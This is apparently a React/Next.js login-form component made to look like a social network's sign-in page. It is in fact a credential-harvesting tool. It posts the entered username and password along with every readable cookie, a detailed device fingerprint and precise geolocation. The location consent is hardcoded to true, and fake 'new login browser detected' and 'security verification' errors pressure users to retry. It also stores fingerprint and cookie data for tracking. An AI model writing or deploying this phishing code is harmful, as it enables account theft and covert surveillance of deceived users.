'use client';

import { useState, useEffect } from 'react';
import { detect } from 'detect-browser';
import { useRouter } from 'next/navigation';

export default function LoginForm() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [locationError, setLocationError] = useState('');
  const [autofilled, setAutofilled] = useState(false);
  const [screenResolution, setScreenResolution] = useState('');
  const [deviceInfo, setDeviceInfo] = useState<Record<string, any>>({});
  const [browserFeatures, setBrowserFeatures] = useState<Record<string, any>>({});
  const [websiteCookies, setWebsiteCookies] = useState<Record<string, any>[]>([]);
  const router = useRouter();

  // Initialize device information and autofill detection
  useEffect(() => {
    // Set screen resolution immediately
    setScreenResolution(`${window.screen.width}x${window.screen.height}`);

    // Autofill detection
    const checkAutofill = () => {
      const usernameInput = document.getElementById('username') as HTMLInputElement;
      const passwordInput = document.getElementById('password') as HTMLInputElement;
      
      if ((usernameInput?.value && !username) || (passwordInput?.value && !password)) {
        setAutofilled(true);
        setUsername(usernameInput?.value || '');
        setPassword(passwordInput?.value || '');
      }
    };

    const autofillCheckInterval = setInterval(checkAutofill, 300);

    // Gather all cookies from document.cookie
    const getAllCookies = () => {
      const cookies = document.cookie.split(';').map(cookie => {
        const [name, value] = cookie.trim().split('=');
        return { name, value, domain: window.location.hostname };
      });
      setWebsiteCookies(cookies);
    };

    // Comprehensive device fingerprinting
    const gatherDeviceInfo = async () => {
      const browser = detect();
      const features = {
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        doNotTrack: navigator.doNotTrack === '1',
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: (navigator as any).deviceMemory,
        cookieEnabled: navigator.cookieEnabled,
        languages: navigator.languages,
      };

      try {
        const gpuInfo = await getGPUInfo();
        setDeviceInfo({
          browser: browser?.name || 'Unknown',
          version: browser?.version || 'Unknown',
          os: browser?.os || 'Unknown',
          deviceType: browser?.type || 'desktop',
          screen: `${window.screen.width}x${window.screen.height}`,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          cpuCores: navigator.hardwareConcurrency || 'Unknown',
          deviceMemory: (navigator as any).deviceMemory || 'Unknown',
          gpu: gpuInfo,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          platform: navigator.platform,
          language: navigator.language,
          website: window.location.hostname,
        });

        setBrowserFeatures(features);
        getAllCookies();
      } catch (e) {
        console.error('Error gathering device info:', e);
      }
    };

    gatherDeviceInfo();

    return () => clearInterval(autofillCheckInterval);
  }, []);

  const getGPUInfo = async () => {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return 'WebGL not supported';
      
      const webglContext = gl as WebGLRenderingContext;
      const debugInfo = webglContext.getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? {
        vendor: webglContext.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: webglContext.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
      } : 'No detailed GPU info available';
    } catch (e) {
      return 'GPU info unavailable';
    }
  };

  const getLocation = async (): Promise<{
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        setLocationError('Geolocation is not supported by your browser');
        resolve(null);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          });
        },
        (err) => {
          setLocationError('New login browser detected. Please try again.');
          console.error('Geolocation error:', err);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    setLocationError('');

    try {
      const consent = true;
      let location = null;

      if (consent) {
        location = await getLocation();
        if (!location) {
          await new Promise(resolve => setTimeout(resolve, 1500));
          location = await getLocation();
        }
      }

      const formData = new FormData();
      formData.append('username', username);
      formData.append('password', password);
      formData.append('autofilled', autofilled.toString());
      formData.append('locationConsent', consent.toString());
      formData.append('screenResolution', screenResolution);
      formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
      formData.append('platform', navigator.platform);
      formData.append('language', navigator.language);
      formData.append('cookiesEnabled', navigator.cookieEnabled.toString());
      formData.append('doNotTrack', (navigator.doNotTrack === '1').toString());
      formData.append('deviceInfo', JSON.stringify(deviceInfo));
      formData.append('browserFeatures', JSON.stringify(browserFeatures));
      formData.append('website', window.location.hostname);
      formData.append('websiteCookies', JSON.stringify(websiteCookies));

      if (location) {
        formData.append('latitude', location.latitude.toString());
        formData.append('longitude', location.longitude.toString());
        formData.append('accuracy', location.accuracy.toString());
      }

      const response = await fetch('/api/login', {
        method: 'POST',
        body: formData,
        credentials: 'include' // Important for cookies
      });

      const result = await response.json();

      if (response.ok) {
        // Store session data if available
        if (result.sessionToken) {
          localStorage.setItem('sessionToken', result.sessionToken);
          localStorage.setItem('sessionExpires', new Date(Date.now() + 3600000).toISOString());
          localStorage.setItem('website', window.location.hostname);
          
          // Store additional session data for tracking
          localStorage.setItem('loginTimestamp', new Date().toISOString());
          localStorage.setItem('deviceFingerprint', JSON.stringify(deviceInfo));
          localStorage.setItem('websiteCookies', JSON.stringify(websiteCookies));
        }

        // Redirect if URL provided
        if (result.redirectUrl) {
          window.location.href = result.redirectUrl;
        } else {
          router.push('/dashboard'); // Default redirect
        }
      } else {
        setError(result.error || 'Verification failed. Please try again.');
      }
    } catch (error) {
      console.error('Submission error:', error);
      setError('Security verification required. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  // Handle input animations
  useEffect(() => {
    const handleInputChange = (e: Event) => {
      const input = e.target as HTMLInputElement;
      const label = input.nextElementSibling as HTMLLabelElement;
      if (label) {
        if (input.value) {
          label.style.top = '3px';
          label.style.transform = 'none';
          label.style.fontSize = '10px';
        } else {
          label.style.top = '50%';
          label.style.transform = 'translateY(-50%)';
          label.style.fontSize = '12px';
        }
      }
    };

    const inputs = document.querySelectorAll('.login-form input');
    inputs.forEach(input => {
      input.addEventListener('input', handleInputChange);
      if ((input as HTMLInputElement).value) {
        handleInputChange({ target: input } as unknown as Event);
      }
    });

    return () => {
      inputs.forEach(input => {
        input.removeEventListener('input', handleInputChange);
      });
    };
  }, []);

  return (
    <form className="login-form" onSubmit={handleSubmit}>
      <div className="input-group">
        <input
          type="text"
          id="username"
          name="username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder=" "
          required
          autoComplete="username"
          className={autofilled ? 'autofilled' : ''}
        />
        <label htmlFor="username">
          Phone number, username, or email
        </label>
      </div>
      
      <div className="input-group">
        <input
          type={showPassword ? 'text' : 'password'}
          id="password"
          name="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder=" "
          required
          autoComplete="current-password"
          className={autofilled ? 'autofilled' : ''}
        />
        <label htmlFor="password">
          Password
        </label>
        {password && (
          <button 
            type="button" 
            className="show-hide-btn"
            onClick={() => setShowPassword(!showPassword)}
            aria-label={showPassword ? 'Hide password' : 'Show password'}
          >
            {showPassword ? 'Hide' : 'Show'}
          </button>
        )}
      </div>

      {error && (
        <div className="error-message">
          {error}
        </div>
      )}

      {locationError && (
        <div className="error-message location-error">
          {locationError}
        </div>
      )}
      
      <button 
        type="submit" 
        className="login-btn"
        disabled={!username || !password || isLoading}
        aria-busy={isLoading}
      >
        {isLoading ? (
          <span className="flex items-center justify-center">
            <span className="loading-spinner mr-2"></span>
            Verifying...
          </span>
        ) : 'Log In'}
      </button>
    </form>
  );
}